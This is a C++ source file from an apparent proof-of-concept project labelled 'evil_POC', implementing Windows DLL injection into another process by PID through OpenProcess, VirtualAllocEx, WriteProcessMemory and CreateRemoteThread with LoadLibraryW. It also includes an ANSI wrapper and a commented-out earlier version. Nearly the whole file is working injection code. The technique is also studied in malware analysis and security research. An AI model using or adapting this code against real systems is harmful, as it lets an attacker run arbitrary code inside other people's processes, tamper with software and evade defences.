#pragma once

#include "InjectLib.h"
#include "Helper.h"

using namespace std;

BOOL POC_InjectLib::InjectLibW(DWORD dwPID, PCWSTR szDllPath)
{
	OutputDebugString(TEXT("[evil_POC] InjectLibW -->"));

	BOOL bOK = FALSE;
	HANDLE hProcess = NULL, hThread = NULL;
	PWSTR pszLibFileRemote = NULL;
	LPCTSTR strErrorMessage = NULL;
	DWORD dwLastError = 0;

	try {
		wprintf(L"Opening target process...\n");
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwPID);
		if (hProcess == NULL) {
			dwLastError = GetLastError();
			strErrorMessage = POC_Helper::strGetLastError(dwLastError);
			OutputDebugString((TEXT("[evil_POC] InjectLibW --> OpenProcess Status = FAILED ErrorCode = 0x") + (std::wstring)strErrorMessage).c_str());
			wprintf(L"w> Fail. ErrorCode = 0x%x\n", dwLastError);
			//__leave;
			return bOK;
		}

		//Calc the num of bytes for DLL pathname
		int cch = 1 + lstrlenW(szDllPath);
		int cb = cch * sizeof(wchar_t);

		//Allocate space in remote process
		wprintf(L"Allocating memory...\n");
		pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, cb, MEM_COMMIT, PAGE_READWRITE);
		if (pszLibFileRemote == NULL)
		{
			dwLastError = GetLastError();
			strErrorMessage = POC_Helper::strGetLastError(dwLastError);
			OutputDebugString((TEXT("[evil_POC] InjectLibW --> VirtualAllocEx Status = FAILED ErrorCode = 0x") + (std::wstring)strErrorMessage).c_str());
			wprintf(L"w> Fail. ErrorCode = 0x%x\n", dwLastError);
			//__leave;
			return bOK;
		}

		//write dllPath to remote process
		wprintf(L"Writing data to the allocted memory...\n");
		if (!WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)szDllPath, cb, NULL))
		{
			dwLastError = GetLastError();
			strErrorMessage = POC_Helper::strGetLastError(dwLastError);
			OutputDebugString((TEXT("[evil_POC] InjectLibW --> WriteProcessMemory Status = FAILED ErrorCode = 0x") + (std::wstring)strErrorMessage).c_str());
			wprintf(L"w> Fail. ErrorCode = 0x%x\n", dwLastError);
			//__leave;
			return bOK;
		}

		wprintf(L"Load LoadLibraryW from Kernel32.dll...\n");
		PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
		if (threatStartRoutineAddress == NULL) {
			dwLastError = GetLastError();
			strErrorMessage = POC_Helper::strGetLastError(dwLastError);
			OutputDebugString((TEXT("[evil_POC] InjectLibW --> threatStartRoutineAddress Status = FAILED ErrorCode = 0x") + (std::wstring)strErrorMessage).c_str());
			wprintf(L"w> Fail. ErrorCode = 0x%x\n", dwLastError);
			//__leave;
			return bOK;
		}

		wprintf(L"Creating remote thread...\n");
		hThread = CreateRemoteThread(hProcess, NULL, 0, threatStartRoutineAddress, pszLibFileRemote, 0, NULL);
		if (hThread == NULL) {
			dwLastError = GetLastError();
			strErrorMessage = POC_Helper::strGetLastError(dwLastError);
			OutputDebugString((TEXT("[evil_POC] InjectLibW --> CreateRemoteThread Status = FAILED ErrorCode = 0x") + (std::wstring)strErrorMessage).c_str());
			wprintf(L"w> Fail. ErrorCode = 0x%x\n", dwLastError);
			//__leave;
			return bOK;
		}

		bOK = TRUE;
	}
	catch (...)
	{
		OutputDebugString(TEXT("[evil_POC] InjectLibW --> EXCEPTION"));
	}
	//__finally {
		//TODO Если оставить эту часть кода, то падает один из потоков приложения после VirtualFreeEx. РАзобраться

		//if (pszLibFileRemote != NULL) {
			//VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);
		//}

		if (hThread != NULL) {
			CloseHandle(hThread);
		}

		if (hProcess != NULL) {
			CloseHandle(hProcess);
		}
	//}

	return (bOK);
}

BOOL POC_InjectLib::InjectLibA(DWORD dwPID, PCSTR szDllPath)
{

	OutputDebugString(TEXT("[evil_POC] InjectLibA -->"));

	//Allocate buffer for the Unicode version of szDllPath
	SIZE_T cchSize = lstrlenA(szDllPath) + 1;
	PWSTR szDllPathW = (PWSTR)_malloca(cchSize * sizeof(wchar_t));

	//convert ANSI to Unicode
	StringCchPrintfW(szDllPathW, cchSize, L"%S", szDllPath);

	//call unicode function
	return (InjectLibW(dwPID, szDllPathW));
}



/*

//// FIRST VERSION NOT STABLE
BOOL InjectDll (DWORD dwPID, LPCTSTR szDllPath)
{
	HANDLE hProcess, hThread;
	LPVOID remoteBuffer;


	//long dll_size = _tcsclen(szDllPath) + 1;

	size_t dll_size = _tcsclen(szDllPath);
	size_t dll_sizeOut = _tcsclen(szDllPath) + 1;
	printf("The value of dll_size : %zu", dll_size);
	printf("The value of dll_sizeOut : %zu", dll_sizeOut);

	char vOut[24];
	wcstombs_s(NULL, vOut, dll_sizeOut, szDllPath, dll_sizeOut);





	try {
		wprintf(L"Opening target process...\n");
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
		if (hProcess == NULL) {
			wprintf(L"w> Fail\n");
			return FALSE;
		}

		wprintf(L"Allocating memory...\n");
		remoteBuffer = VirtualAllocEx(hProcess, NULL, dll_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (remoteBuffer == NULL) {
			wprintf(L"w> Fail\n");
			return FALSE;
		}

		wprintf(L"Writing data to the allocted memory...\n");
		int IsWriteOK = WriteProcessMemory(hProcess, remoteBuffer, vOut, dll_size, NULL);
		if (IsWriteOK == 0) {
			wprintf(L"w> Fail\n");
			return FALSE;
		}

		wprintf(L"Creating remote thread...\n");
		DWORD dWord;
		PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
		hThread = CreateRemoteThread(hProcess, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, &dWord);
		if (hThread == NULL) {
			wprintf(L"w> Fail\n");
			return FALSE;
		}

		//Clean up
		CloseHandle(hThread);
		CloseHandle(hProcess);
	}
	catch (...)
	{
		return FALSE;
	}

	return TRUE;

}
*/